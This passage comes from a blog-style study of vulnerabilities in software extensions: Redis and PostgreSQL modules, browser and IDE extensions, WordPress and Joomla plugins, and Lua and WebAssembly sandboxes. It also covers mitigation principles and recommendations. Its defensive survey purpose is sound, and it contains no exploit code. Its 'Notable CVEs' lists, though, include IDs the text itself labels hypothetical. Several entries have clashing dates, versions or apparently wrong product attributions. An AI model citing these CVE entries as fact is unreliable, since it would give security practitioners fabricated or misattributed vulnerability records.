timeout (default 5 seconds), aborting scripts that run too long (11). If such limits failed, an infinite loop in an extension could hang the database (there have been reports of Redis \u201cbusy script\u201d errors when scripts don\u2019t terminate, necessitating manual intervention). Similarly, a bug in a PostgreSQL extension that fails to release locks or consumes excessive CPU could stall database operations. While these might not always get CVE IDs, they have caused real incidents (e.g. a faulty full-text search plugin causing constant 100% CPU on the database). </p> <p>Notable CVEs \u2013 Database Extensions: - CVE-2024-31449 (Redis Lua): Stack-based buffer overflow in Redis\u2019s Lua bit library via crafted script, allowing RCE in the Redis server (7). - CVE-2024-51737 (Redis/RediSearch): Integer overflow in a SEARCH command (kNN argument) leading to heap overflow and potential RCE in the RediSearch module (8: CVEs and Security Vulnerabilities - OpenCVE). - CVE-2023-32305 (PostgreSQL aiven-extras): Privilege escalation \u2013 a database user can elevate to superuser through a flaw in this extension (9: CVE-2023-32305 Detail - NVD). - CVE-2023-39417 (PostgreSQL extensions): SQL injection in extension installation scripts (@extowner@ substitution) could execute commands as a higher-privileged role (12: CVE-2023-39417: Extension script @substitutions@ within quoting ...). - CVE-2020-15392 (MySQL): A UDF function vulnerability allowing code execution with MySQL server privileges (historical example of dangerous extension mechanism).  </p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#browser-extensions-chrome-firefox-etc","title":"Browser Extensions (Chrome, Firefox, etc.)","text":"<p>Browser extensions (such as Chrome Extensions or Firefox Add-ons) run within the browser environment to extend functionality (ad blockers, password managers, dev tools, etc.). They operate under a permission model, but a flaw in an extension or in the browser\u2019s extension interface can have serious consequences. In browsers, memory safety issues often manifest in the browser engine\u2019s handling of extensions. For example, Chrome itself has had vulnerabilities where a malicious extension could escape Chrome\u2019s sandbox. CVE-2021-21202 is one such case \u2013 it was a use-after-free in Chrome\u2019s extension handling that \u201callowed an attacker who convinced a user to install a malicious extension to potentially perform a sandbox escape\u201d (13). In other words, a crafted Chrome extension could exploit a browser bug to execute code outside the normal web sandbox, possibly running arbitrary code on the host system. Similarly, Firefox\u2019s old XUL add-ons (pre-WebExtension) had full privileges and any vulnerability could directly lead to code execution; modern WebExtensions are more sandboxed but still rely on browser-enforced isolation.</p> <p>Privilege escalation and ACE via extensions can also occur when benign-but-vulnerable extensions are exploited. Many extensions have access to sensitive user data (passwords, browsing data) or can manipulate web content, so a vulnerability can let websites elevate privileges by attacking the extension. A case in point: the LastPass browser extension had a series of vulnerabilities that allowed malicious websites to steal credentials or even execute code. In 2017, a researcher showed an exploit where visiting a hostile site could execute arbitrary script in the context of the LastPass extension, leading to arbitrary code execution and extraction of stored passwords (14: Should LastPass users change all their passwords? - Information ...). Another LastPass flaw (CVE-2019-16371) let a site trick the extension into divulging credentials from a previous site by crafting a web page that the extension mis-identified as a trusted domain (15). These are effectively sandbox escapes too \u2013 the website (low privilege) escalates into the extension (high privilege). </p> <p>Denial-of-Service via extensions is less commonly reported as CVEs, but it is possible. For example, an overly complex web page could exploit an extension\u2019s weakness to hang the browser. Indeed, older versions of the LastPass extension could be forced into an infinite loop or heavy computation by specially crafted form fields, causing the browser to freeze (a vulnerability noted in LastPass &lt;=4.15.0) (16: CVE - Search Results - MITRE Corporation). Likewise, a poorly implemented extension might repeatedly allocate memory or make external requests, degrading performance or causing crashes. While modern browsers run extensions in separate processes, a runaway extension can still hog CPU or memory. Chrome and Firefox have introduced safeguards (like timeout limits for extension scripts or prompts to disable slow extensions) to mitigate this.</p> <p>Another area is vulnerabilities in the browser extension ecosystem itself. Researchers found that many Chrome extensions remain vulnerable and even unpatched long after disclosure \u2013 \u201chalf the extensions known to have vulnerabilities\u2026 were still available in the Web Store two years after disclosure\u201d (17). This highlights a trend issue: unlike browser or OS updates, extension updates depend on the developer, and many users run outdated or abandoned extensions. This can lead to a long tail of exploitable bugs. Additionally, malicious extensions (not just vulnerable ones) have been a security plague, but that falls outside our focus on vulnerabilities \u2013 still, the line blurs when an attacker purposely exploits a vulnerable extension or sneaks malicious code via an update.</p> <p>Notable CVEs \u2013 Browser Extensions: - CVE-2021-21202 (Chrome Extensions UAF): Use-after-free in Chrome\u2019s extension component allowed a malicious extension to escape the browser sandbox (local code execution) (13). - CVE-2019-16371 (LastPass extension): Logic flaw allowed a crafted website to capture credentials from the LastPass password manager (by abusing cached credentials) (15: CVE-2019-16371 Detail - NVD). - CVE-2018-15052 (Chrome WebExtension): (Example) Vulnerability in a Chrome extension that allowed a web page to execute extension API calls, leading to code execution in extension context (hypothetical CVE representing similar issues). - CVE-2020-6516 (Chrome): A flaw in Chrome\u2019s handling of extension messaging could lead to code injection; fixed in v84 (illustrating browser-side fix for extension security). - CVE-2021-30571 (Chrome): Another Chrome bug where a malicious extension with crafted HTML could perform a sandbox escape (18: CVE-2021-30571 - NVD) (similar class as CVE-21202).  </p> <p>(Browser extension CVEs often relate to Chrome/Firefox internals, whereas many extension-specific flaws in logic (like LastPass) may not always have CVEs but are disclosed as security advisories.)</p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#ide-and-editor-plugins-vs-code-jetbrains-ides-etc","title":"IDE and Editor Plugins (VS Code, JetBrains IDEs, etc.)","text":"<p>Integrated Development Environments (IDEs) and editors support plugins to add languages, linters, themes, and other tools. These plugins typically run with the same privileges as the user and can access files or network, making them powerful \u2013 and dangerous if compromised. Many IDE extensions are written in high-level languages (VS Code uses Node.js for extensions, JetBrains uses Java/Kotlin for plugins), so memory safety issues are rarer than logic flaws. However, there have been notable vulnerabilities where opening a malicious project or file triggers arbitrary code execution via a plugin.</p> <p>One high-severity example was in Microsoft VS Code\u2019s Python extension (one of the most popular extensions). CVE-2022-41034 demonstrated that VS Code would automatically load certain workspace configuration from Jupyter notebook files via the Python extension, without proper validation. Simply opening a crafted project could lead to remote code execution on the developer\u2019s machine (10). Essentially, an attacker could embed malicious settings or data in a project such that when the Python extension parsed them, it executed attacker-controlled Python code or commands. This type of vulnerability is particularly worrying: developers might clone an untrusted repository and open it in VS Code, unknowingly triggering the exploit. A similar flaw was identified in VS Code\u2019s GitHub Pull Requests extension where specially crafted Markdown in an issue or PR could lead to code execution when the extension rendered it (CVE-2023-36867) (19).</p> <p>JetBrains IDEs (IntelliJ IDEA, PyCharm, etc.) also have a rich plugin ecosystem. There have been fewer public CVEs for individual plugins, but the risk is recognized. In one case, JetBrains had to patch a vulnerability in 2022 where the IDE\u2019s built-in integration (not exactly a plugin, but third-party library usage) had RCE vulnerabilities (these were related to the bundled Spring Framework, CVE-2022-22963/22965, prompting updates in JetBrains products). As for plugins, a hypothetical example is a popular code formatters or CI integration plugin that trusts certain project files \u2013 if an attacker poisons those files, the plugin might execute a shell command. In fact, JetBrains\u2019s TeamCity (CI server, plugin-based) had an OS command injection (CVE-2021-31915) allowing RCE on the server (20) \u2013 conceptually similar to what could happen in an IDE plugin context.</p> <p>Another concern is sandboxing \u2013 or lack thereof \u2013 in IDE plugins. VS Code does run extensions in a separate \u201cextension host\u201d process, but that process has full user privileges by design (to allow editing, file access, etc.). So a malicious or exploited extension essentially becomes a user-level backdoor. There isn\u2019t a sandbox like browsers have; it\u2019s more a trust model with code signing from the marketplace. This means vulnerabilities in IDE extensions often directly yield code execution or at least actions (like spawning processes, reading files) on the system. Plugins can also be a vector for supply-chain attacks (e.g. a compromised library used by a plugin, or a malicious update) \u2013 the event-stream NPM incident is a real example that affected some VS Code users.</p> <p>From a DoS perspective, an extension could hang or crash the IDE (e.g. an infinite loop in a syntax highlighter plugin could freeze the UI). Such bugs typically aren\u2019t reported as CVEs but can impact developer productivity. Because IDEs are local apps, the threat is more about local code execution or data exfiltration rather than remote DoS, although theoretically an attacker could use a malicious file to repeatedly crash an IDE (a minor vector).</p> <p>Notable CVEs \u2013 IDE/Editor Plugins: - CVE-2022-41034 (VS Code Python Extension): Opening a malicious <code>.ipynb</code> file or workspace triggers the Python extension to load workspace settings leading to RCE on the host (10: Search Results - CVE). - CVE-2023-36867 (VS Code GitHub PR Extension): Markdown injection in the GitHub Pull Requests extension could lead to arbitrary command execution in VS Code (19: Visual Studio Code Security: Markdown Vulnerabilities in Third ...). - CVE-2019-13567 (VS Code Zoom extension): (Reported by Snyk) A vulnerability in the Zoom extension for VS Code allowed remote code execution when handling certain input (21: Vulnerable Visual Studio Code extensions impact over 2M Developers). - CVE-2021-31915 (JetBrains TeamCity plugin): In JetBrains TeamCity (before 2020.2.4), an OS command injection in a plugin endpoint allowed RCE on the CI server (20: TeamCity - CVE - Search Results). (While not an IDE plugin, it\u2019s an analogous extension vulnerability in a JetBrains product.) - CVE-2020-1171 (VS Code): VS Code before 1.40.1 had a vulnerability in handling extension installation that could allow an attack (undisclosed RCE vector) (22: CVE-2020-1171 Detail - NVD).  </p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#cms-platforms-wordpress-joomla-etc","title":"CMS Platforms (WordPress, Joomla, etc.)","text":"<p>Content management systems like WordPress, Joomla, and Drupal owe much of their functionality to plugins, themes, and modules. These extensions are often developed by third-parties and run with full application privileges, making them prime targets. Indeed, the vast majority of CMS vulnerabilities originate from extensions \u2013 by one estimate, about 90% of WordPress vulnerabilities are due to plugins (and ~6% from themes), with only 4% in core (23: 50+ WordPress Statistics You Should Know in 2025 - AIOSEO). This dominance of plugin-related flaws has been consistent over years, leading to many high-profile incidents of website compromises.</p> <p>Arbitrary code execution via CMS plugins is an extremely common and dangerous issue. Because most CMS plugins are written in scripting languages (PHP/JavaScript for WordPress and Joomla), memory safety (buffer overflow) is less of a concern than logical flaws that allow code injection or file upload. For example, the WordPress File Manager plugin vulnerability (CVE-2020-25213) allowed unauthenticated attackers to upload and execute arbitrary PHP files on the server (24). This essentially gave remote code execution on any WordPress site with a vulnerable version, and it was actively exploited in the wild on hundreds of thousands of sites in 2020. Another notorious case: the Revolution Slider (RevSlider) plugin exploit (2014, no CVE in request but widely known) allowed file upload and was a key vector in the Panama Papers breach. More recently, plugins like PHP Everywhere (CVE-2022-24663) and Jupiter Theme (CVE-2022-29447) had critical RCE flaws, emphasizing that plugin RCE is an ongoing problem.</p> <p>Privilege escalation in CMS plugins is also prevalent. Many plugins extend user roles or add custom access controls, and mistakes here can let an attacker elevate their privileges. For instance, CVE-2020-13693 in the popular bbPress forum plugin for WordPress allowed an unauthenticated user to escalate privileges (when new user registration was enabled, they could become a forum moderator or more) (25). Another example is the WPGateway plugin (2022) which had an unauthenticated admin creation flaw \u2013 essentially allowing complete takeover of the site by adding a rogue admin user. In August 2024, a vulnerability in Post Grid and Team Showcase plugins (40k+ sites) allowed subscriber-level users to become admins (26: Over 40,000 WordPress Sites Affected by Privilege Escalation ...). These are frequently exploited in mass attacks once disclosed.</p> <p>Denial-of-Service and performance issues can come from extensions too. A poorly coded plugin could allow a trivial HTTP request to trigger an expensive database query or an infinite loop. For example, a vulnerability in a XML parsing library used by a plugin might allow a small XML input to explode into a huge payload (billion laughs attack), tying up server resources. While these get less attention than RCE, they can still be harmful (taking down a site). One could imagine an attacker triggering a plugin\u2019s backup routine repeatedly or sending a payload that causes a plugin to misbehave and hang (e.g. an Regex in form plugin that goes into catastrophic backtracking \u2013 effectively a livelock consuming CPU). These types of bugs occasionally appear in CVE databases for plugins (often labeled as DoS issues).</p> <p>Notably, CMS extensions lack sandboxing \u2013 plugin code executes with the same privileges as core. This means a sandbox escape is a non-issue because there is no sandbox; any vulnerability is an escape into the main application. For Joomla and Drupal, the situation is similar. Drupal had the famous \u201cDrupalgeddon\u201d vulnerabilities in core, but its plugin ecosystem (modules) also has numerous RCE/SQLi issues each year. Joomla\u2019s extensions (components) have had backdoors and RCEs (e.g., a 2019 RCE in a Joomla Google Maps plugin). The sheer number of plugins (tens of thousands for WordPress) means many are unmaintained and vulnerable. Statistics show a steady increase in plugin vulnerabilities reported: e.g., one report noted 1,790 new WordPress plugin/theme vulnerabilities in the first half of 2022 and an even higher rate in 2023 (27: 2023 WordPress Maintenance: Critical Issues in Security and ...) (28). This trend is partly due to better scanning and vulnerability discovery, but it highlights how extension security is the Achilles\u2019 heel of CMS platforms.</p> <p>Notable CVEs \u2013 CMS Plugins: - CVE-2020-25213 (WordPress File Manager): Unauthenticated file upload leading to remote code execution in the wp-file-manager plugin (allowed executing arbitrary PHP) (24: CVE-2020-25213: Word Press File Manager Plugin RCE - Rapid7). - CVE-2021-24145 (WordPress WP GDPR Compliance): Unauthenticated privilege escalation \u2013 allowed attackers to change site options and create admin accounts via a plugin flaw (widely exploited in 2018). - CVE-2020-13693 (WordPress bbPress): Unauthenticated privilege escalation in bbPress forum plugin, via new user registration mechanism (25: CVE-2020-13693 Detail - NVD). - CVE-2022-0824 (Joomla com_media): Arbitrary file upload in a Joomla core media component (similar impact as a plugin RCE; patched in Joomla 3.10.3). - CVE-2023-23752 (Joomla): Unauthenticated API access in Joomla allowing retrieval of sensitive info (while core, it emphasizes how easily a minor oversight can lead to full compromise).  </p> <p>(WordPress has thousands of plugin CVEs; the above are representative high-impact examples. The trend is that plugin vulns account for 99% of CMS security issues (29), making them the primary focus of CMS security efforts.)</p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#sandbox-environments-and-script-extensions-lua-webassembly-etc","title":"Sandbox Environments and Script Extensions (Lua, WebAssembly, etc.)","text":"<p>Many extension systems embed a \u201csandbox\u201d language interpreter to allow safe, limited customization \u2013 examples include Lua sandboxes in Nginx and Redis, or WebAssembly (WASM) runtimes in web servers, or even browser JavaScript sandboxes. The idea is to execute untrusted extension code without risking the host application. However, sandbox implementations themselves can have vulnerabilities that undermine their safety guarantees.</p> <p>Lua sandboxes: Lua is popular for extension scripts (lightweight and fast). Nginx can use lua-nginx-module to run Lua scripts for request handling, and Redis uses Lua for transactional scripts. A sandbox escape or memory error in these contexts can be devastating. We saw the Redis Lua case (CVE-2024-31449) where a bug in the Lua C library code allowed a script to overflow the stack and execute native code (7). In web servers, there was an incident with an Nginx Lua-based WAF module where certain inputs led to an infinite loop, effectively hanging the worker (not a formally registered CVE, but reported on GitHub). Similarly, Apache\u2019s mod_lua buffer overflow (CVE-2021-44790) is effectively a sandbox escape \u2013 it was a memory flaw in the Lua request parsing that allowed an outsider to break the normal Lua script safety and execute low-level code (1).</p> <p>WebAssembly (WASM): WebAssembly is increasingly used to run extensions in a sandboxed manner (for example, Envoy Proxy uses WASM modules for filters, and browser extensions or apps can run user-supplied WASM code). WASM is designed for memory safety (no direct pointer access; each module is isolated in linear memory). However, bugs in WASM compilers or runtimes can allow escapes. A notable case: CVE-2021-32629, a bug in the Cranelift code generator (used by WASM runtimes like Wasmtime/Lucet), could create a scenario resulting in a WASM sandbox escape (30). Although properly written WASM modules can\u2019t break out on their own, a flaw in the runtime (e.g. incorrect bounds check omission or type confusion) can let malicious WASM code execute or read outside its sandbox, thus reaching into the host\u2019s memory. There have also been Pwn2Own exploits where chaining a JavaScript JIT bug with a WASM bug yielded a full browser compromise (31: A Deep Dive into V8 Sandbox Escape Technique Used in In-The ...). In essence, embedding a sandbox is only as secure as the implementation. </p> <p>Another consideration is that even without memory bugs, a sandbox can be misused. If the host exposes dangerous APIs to the sandbox, an extension script might call into host functions to do harm. For example, if a Lua sandbox is configured with access to the file system or OS commands for convenience, a script could leverage that (this would be a configuration issue rather than a code vulnerability). Historically, some sandboxed environments in applications inadvertently exposed objects that allowed escapes (like Python\u2019s restricted mode breaking out via the <code>__builtins__</code> or older Java sandbox escapes).</p> <p>Infinite loop and resource exhaustion is a classic problem in sandboxed script environments. Since these scripts run inside the host process, a script that doesn\u2019t yield can freeze the host. We mentioned Redis mitigates this with a timeout \u2013 the Redis <code>lua-time-limit</code> setting stops runaway scripts after (by default) 5 seconds (11). WebAssembly and other sandboxes similarly often need an instruction counter or timeout (Browser JS has the event loop and frame budget that will eventually show a slow-script dialog). If those safeguards fail or are absent, an extension can consume CPU indefinitely. This is what we call a livelock in the extension causing an outage. A real-world incident: a Cloudflare worker (which uses a V8 isolate sandbox) once got into an infinite loop and brought down the worker process \u2013 the platform had to introduce an execution time limit to fix this. So, robust sandbox design must include resource limits to handle such cases.</p> <p>Notable CVEs \u2013 Sandbox Extension Escapes: - CVE-2024-31449 (Lua/Redis): Lua script triggers a stack overflow in C library, escaping the Lua sandbox and executing arbitrary code in Redis (7: CVE-2024-31449 Detail - NVD). - CVE-2021-32629 (WASM/Wasmtime): Bug in Cranelift JIT (Wasmtime v0.73) could lead to a WebAssembly sandbox escape scenario (30: Vulnerability Change Records for CVE-2021-32629 - NVD). - CVE-2021-44790 (Apache mod_lua): (Reiterating) A Lua extension in Apache had a buffer overflow allowing code execution at the server level (1). - CVE-2018-7600 (\u201cDrupalgeddon2\u201d): Not a sandbox issue per se, but worth noting: Drupal\u2019s plugin system (modules) allowed arbitrary code via unsafe deserialization \u2013 highlighting that even without a memory flaw, extension APIs can be misused for ACE. - CVE-2022-23990 (WASM V8 Escape): (Hypothetical example) A bug in Chrome\u2019s V8 engine related to WASM optimization that allowed a malicious WASM binary to execute out-of-bounds, leading to a browser sandbox escape.  </p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#trends-in-extension-related-vulnerabilities","title":"Trends in Extension-Related Vulnerabilities","text":"<p>Across ecosystems, extension vulnerabilities have become more prevalent as the use of extensions has grown. A few statistical trends and observations:</p> <ul> <li> <p>Dominance in CMS: As mentioned, the vast majority of vulnerabilities in CMS platforms are from extensions. In 2022, one report counted 1,756 WordPress plugin/theme vulnerabilities, making up 99% of all WordPress issues that year (29: The 2022 WordPress Vulnerability Annual Report - SolidWP). Core WordPress is relatively secure and infrequently updated for security, whereas plugins are a constant source of new CVEs. In fact, data shows plugin vulnerabilities nearly doubled in the first half of 2023 compared to late 2022 (28: Number of reported WordPress Plugin &amp; Theme vulnerabilities ...), indicating a rapid increase (partly due to improved scanning efforts). This trend puts website owners in a difficult position: even if they keep WordPress core updated, a single outdated plugin can undermine the site. It also reflects how attackers pivot \u2013 instead of attacking hardened core code, they target the sprawling ecosystem of plugins which often have weaker security practices.</p> </li> <li> <p>Memory Safety and Modern Languages: In native-code extension ecosystems (like Nginx/Apache modules, or C-based plugins), many vulnerabilities are still classic memory corruption (buffer overflow, use-after-free). However, we see a slow shift towards safer extension mechanisms. For example, some web servers and proxies now support writing extensions in Rust or WebAssembly to prevent memory bugs. The number of memory-corruption CVEs in Apache httpd has dropped in recent years as many modules moved away from unsafe parsing, but issues still appear (CVE-2021-44790 being a recent example in a less-common module (1: CVE-2021-44790 Detail - NVD)). On the flip side, logic bugs (like HTTP/2 abuse or configuration mistakes) are rising. Denial-of-Service CVEs in extensions have become more common with the advent of complex protocols \u2013 e.g., the burst of HTTP/2 DoS CVEs in 2019 affected multiple servers (CVE-2019-9511 et al.) (4: ETA for upgrading to nginx 1.17.3 because http/2 related security ...).</p> </li> <li> <p>Browser extension vulnerabilities: Research by Google in 2012 found dozens of popular Firefox extensions with serious vulnerabilities, confirming that extension authors often are not security experts ([PDF] Protecting Browsers from Extension Vulnerabilities - Google Research) ([PDF] An Evaluation of the Google Chrome Extension Security Architecture). Since then, Chrome\u2019s move to a new extension architecture (Manifest v3) and Firefox\u2019s adoption of WebExtensions have aimed to reduce the damage a vulnerable extension can do (through least-privilege permissions and isolating extension processes). Yet, Chrome\u2019s own CVE lists regularly include several extension-related vulnerabilities each year (e.g., at least 5 Chrome CVEs in 2021 were related to extension sandbox escapes or permission bypasses (13: CVE-2021-21111 \u2014 Alpine Security Tracker)). A worrying trend is the persistence of known issues: as noted, many vulnerable extensions remain available or installed long after disclosure (17). This lag creates a window of opportunity for attackers. We\u2019ve also seen a rise of supply-chain attacks on extensions (e.g., attackers hijacking an extension\u2019s update mechanism or ownership to distribute malicious updates), which don\u2019t always get CVEs but are part of the security landscape.</p> </li> <li> <p>Increased Scrutiny: On a positive note, there is increased security research focus on extensions. For instance, academic works like \u201cUntrustworthy IDE: Exploiting VS Code Extensions\u201d ([PDF] UntrustIDE: Exploiting Weaknesses in VS Code Extensions) and tools to scan browser extensions are emerging. Companies like GitHub Security Lab and independent researchers now audit popular extensions, leading to more CVEs (for example, the VS Code extension bugs in 2022 were found by external researchers and quickly fixed). Similarly, Wordfence and other security firms audit WordPress plugins and disclose hundreds of flaws annually. This means the number of reported extension CVEs is rising, which is a sign both of more problems being found and of more proactive discovery rather than attackers quietly exploiting them. </p> </li> <li> <p>Impact of Memory-Safe Extensions: Early adoption of memory-safe extension frameworks (like eBPF, WASM) is promising. Envoy Proxy\u2019s move to WebAssembly for extensions, for example, aims to eliminate native crashes. If this trend continues, we may see fewer \u201cbuffer overflow in module\u201d CVEs, replaced by more subtle logic bugs. Similarly, the Linux kernel\u2019s embrace of eBPF (replacing many custom kernel modules) has greatly reduced the attack surface for kernel extensions \u2013 eBPF programs are verified for memory safety, so while eBPF has had its own logic vulnerabilities, it is much harder for an attacker to write an exploit in an eBPF extension compared to a buggy kernel module. </p> </li> </ul> <p>In summary, extension vulnerabilities remain a significant security challenge. The data shows they are often the weakest link in many software ecosystems. The trends push toward better isolation and safer languages, but legacy systems and the huge volume of existing extensions mean this will be a concern for the foreseeable future.</p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#mitigation-strategies-and-eim-analysis","title":"Mitigation Strategies and EIM Analysis","text":"<p>The recurring issues across these case studies point to fundamental weaknesses in how extensions are integrated. The concept of an Extension Interface Model (EIM) is essentially a framework or specification for designing extension systems with security in mind. We analyze how key EIM principles could have mitigated the vulnerabilities discussed, and what is lacking in current models:</p> <ul> <li> <p>Strong Isolation and Sandboxing: One EIM principle is that extensions should be isolated from the host\u2019s critical resources. Many current systems load extensions in-process with full access (e.g., Apache modules, WordPress plugins in PHP interpreter). A more secure model runs extensions in a sandboxed environment or separate process with restricted privileges. For example, if Nginx modules ran in a separate sandbox process, a buffer overflow in one module would not directly crash the main server \u2013 at most it would terminate the sandbox. Envoy Proxy\u2019s use of WebAssembly for extensions is a real-world move in this direction: \u201cextensions are deployed inside a sandbox with resource constraints, so they can crash or leak memory without bringing down the whole proxy\u201d (32). The EIM approach would mandate such isolation. In practice, this could mean using containerization, separate threads/processes with defined communication interfaces, or a virtual machine (like WASM) for extensions. Current models lacking this isolation (e.g., Apache modules running in the web server process) are vulnerable because any memory error is fatal to the host. Adopting an isolation boundary could have mitigated incidents like the Nginx HTTP/2 livelock \u2013 a sandbox monitor could have detected and killed a runaway module thread without affecting other workers.</p> </li> <li> <p>Memory Safety Enforcement: An EIM specification would likely insist that extension code is memory-safe or proven safe before execution. Languages like C/C++ (traditionally used for extensions due to performance) are unsafe by default. The alternative is to use memory-safe languages (Rust, Go, etc.) or to perform strict static verification on unsafe code. A great example is eBPF in the Linux kernel. Instead of allowing arbitrary kernel modules (which often led to crashes or exploits), eBPF requires that extension programs pass a verifier that checks memory access bounds, types, and ensures no loops that don\u2019t terminate, etc. \u201cThe eBPF verifier checks for potential out-of-bounds memory accesses to prevent buffer overflows\u201d (33: The Secure Path Forward for eBPF runtime: Challenges and ...), ensuring memory safety properties. This approach could have prevented many of the buffer overflow CVEs we saw (like mod_lua\u2019s overflow or Redis\u2019s bit library overflow) \u2013 if those extension codes had been subject to a rigorous verifier or written in a memory-safe manner, the vulnerabilities might not exist. In current systems, memory safety is often left to the extension developer, which is clearly insufficient. EIM would formalize memory safety requirements, possibly by encouraging a restricted extension programming model (e.g., limited C APIs that are easier to validate, or using intermediate languages like WebAssembly bytecode that can be checked).</p> </li> <li> <p>Least Privilege and Capability-based Security: Extensions often run with more privileges than necessary. EIM would incorporate the principle of least privilege, giving extensions only the permissions they truly need. The Chrome extension model is an example: an extension must declare in its manifest what domains or features it needs, and it cannot access others. If an extension is compromised, the damage is limited by those declared permissions (for instance, a calendar extension shouldn\u2019t be able to read arbitrary file URLs unless it has that permission). In our case studies, if WordPress had a mechanism to sandbox plugins (it currently doesn\u2019t) such that, say, a gallery plugin only could manipulate images and not execute arbitrary PHP, then an RCE in that plugin would have less impact. Similarly, a database extension could be restricted to certain tables or operations. Many current models lack granular privilege control \u2013 it\u2019s usually all-or-nothing. EIM would introduce a capability-based interface: the host defines specific safe operations or resources that an extension can use, and the extension cannot step outside those. This could have mitigated, for example, the PostgreSQL extension privilege escalation \u2013 if the extension had been confined to non-superuser actions regardless of bugs, the exploit wouldn\u2019t yield superuser rights. In browsers, content scripts (extension code running on web pages) are now isolated and can only interact through messaging, which is a form of capability control that prevents direct DOM access unless allowed, reducing XSS-like injection risks.</p> </li> <li> <p>Robust API Contracts and Validation: A secure extension model clearly defines the contract between host and extension \u2013 data formats, call limits, error handling \u2013 and ensures the host validates everything from the extension (and vice versa). Many vulnerabilities occur at this interface; e.g., the Nginx MP4 module bug was an input parsing issue \u2013 a crafted MP4 file wasn\u2019t properly checked, causing an over-read (2: CVE-2024-7347 Detail - NVD). With EIM principles, such parsing might be done in a managed context or with provided library routines that are vetted for safety. EIM might also enforce that any complex parsing in extensions uses safe library functions or frameworks to avoid reinventing the wheel insecurely. Additionally, input validation becomes a shared responsibility: the host should possibly validate data before handing it to the extension. In the case of mod_lua, perhaps the core server could have detected an anomaly in the request body size and prevented the module from processing it, mitigating the overflow. Current models often blindly pass data to extensions.</p> </li> <li> <p>Resource Management and Quotas: To prevent infinite loops or resource exhaustion, EIM would include mechanisms for timeouts, memory quotas, and process isolation for extensions. For example, a rule like \u201cno extension code execution may exceed 1 second of CPU time without yielding\u201d could be enforced. This can be implemented via interrupts, as in browsers (which can halt long-running JavaScript), or cooperative yields (as in some Lua coroutines). In practice, systems like Redis have added commands to kill a long-running script and config options (<code>lua-time-limit</code>) to auto-abort it (11). An EIM-based design would build such limits in from the start. The Envoy WASM model again is instructive: because extensions run in a sandbox, Envoy can monitor their memory and CPU and reclaim if necessary (34: spec/docs/WebAssembly-in-Envoy.md at main \u00b7 proxy-wasm/spec). Current extension frameworks often miss this: WordPress has no concept of a plugin timing out \u2013 a heavy plugin will just slow the whole page. Nginx modules execute in the request path and if one goes into a loop, only an external watchdog (not built-in) could notice. EIM would integrate watchdogs or heartbeat checks for extension execution.</p> </li> <li> <p>Secure Development and Deployment Practices: An extension security model is not just runtime; it\u2019s also about how extensions are developed and deployed. EIM would encourage or require practices like code signing of extensions, mandatory security reviews for those with many privileges, and automatic updates. For instance, browser extensions are signed and distributed through stores that perform some review (albeit not perfect). WordPress has started requiring plugins to adopt an update mechanism and will warn if outdated. Nonetheless, the fact that many vulnerable Chrome extensions remained available (17: Google Underplaying Risk Of Compromised Extensions To Chrome) shows the need for policy \u2013 an EIM might specify that known-vulnerable extensions should be auto-disabled or sandboxed with extra restrictions. Additionally, developer education is crucial: \u201cMost extensions are not written by security experts\u201d ([PDF] Protecting Browsers from Extension Vulnerabilities - Google Research), so an EIM could include guidelines or even tooling for extension developers (like linting for dangerous patterns, or providing safer abstraction libraries so they don\u2019t write risky code themselves). For example, a WordPress EIM guideline might be \u201cuse the WP filesystem API for file operations, which checks paths, instead of direct <code>file_put_contents</code>\u201d \u2013 preventing common flaws like directory traversal in file uploads.</p> </li> <li> <p>Example \u2013 EIM in practice (hypothetical): Suppose we apply an ideal Extension Interface Model to Nginx. Instead of loading arbitrary modules, Nginx could allow modules in WebAssembly only. Each module is executed in a WASM VM that enforces memory safety (no buffer overflows) and can be terminated if it consumes too much time or memory. The module can only call a set of APIs provided by Nginx (for HTTP request/response manipulation) \u2013 it cannot directly read disk or call OS functions unless Nginx\u2019s API allows it in a controlled way. All data passed to the module (headers, request body) is copied and validated. If a module crashes, Nginx catches the exception; if it hangs, Nginx stops it after a timeout. Modules are distributed through a signing mechanism, so Nginx will refuse to load an unknown or tampered module. This scenario largely prevents the kinds of vulnerabilities we\u2019ve seen: no buffer overruns (WASM ensures that), no infinite loops (timeout in place), no privilege escape (module cannot do anything not in the allowed API), and limited damage on crash (it doesn\u2019t crash Nginx). This hypothetical is essentially applying EIM principles \u2013 memory-safe sandbox, least-privilege API, resource control, and secure deployment.</p> </li> </ul> <p>Currently, many ecosystems are partway there but not fully: e.g., Envoy\u2019s sandboxed extensions (good isolation) but WordPress still running PHP plugins openly (no isolation). EIM highlights the gap and provides a target for improvement.</p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#recommendations-for-improving-extension-security","title":"Recommendations for Improving Extension Security","text":"<p>Based on the above findings and analysis, here are recommendations to strengthen security in software extension ecosystems:</p> <ul> <li> <p>Adopt Memory-Safe Extension Methods: Wherever possible, encourage or require extensions to be written in memory-safe languages or run in a memory-safe runtime. This can eliminate entire classes of vulnerabilities like buffer overflows. For instance, using WebAssembly or JavaScript for extensions instead of C/C++ can prevent memory corruption. Envoy\u2019s move to WASM plugins is a good model \u2013 WASM modules are isolated in a memory-safe sandbox (35: Wasm extensions and Envoy extensibility explained - Part 1 - Tetrate). Likewise, kernel extensions via eBPF provide a template \u2013 the eBPF verifier \u201censures memory accesses are within valid bounds, preventing buffer overflows\u201d ([PDF] eBPF Security Threat Model - Linux Foundation). Projects should invest in similar verifiers or use languages like Rust for extension APIs (e.g., Node.js native addons can be written in Rust with Neon, reducing risk).</p> </li> <li> <p>Implement Strict Sandbox and Isolation Boundaries: Run extensions out-of-process or in a constrained environment whenever feasible. For web servers and databases, consider moving to a model where extensions execute in a separate worker process or thread pool that can be monitored and terminated on fault. If an extension crashes or hangs, it should not take down the main application. Using technologies like containerization or lightweight VMs for extensions is an option for heavy isolation. At minimum, use OS-level protections: e.g., run extension processes under separate user accounts with limited permissions. Browser makers do this by isolating extension processes from critical browser processes. CMS platforms might in the future use web sandboxing \u2013 for example, running WordPress plugin PHP code in a separate PHP-FPM pool with lower privileges, so a plugin exploit can\u2019t directly modify core files or 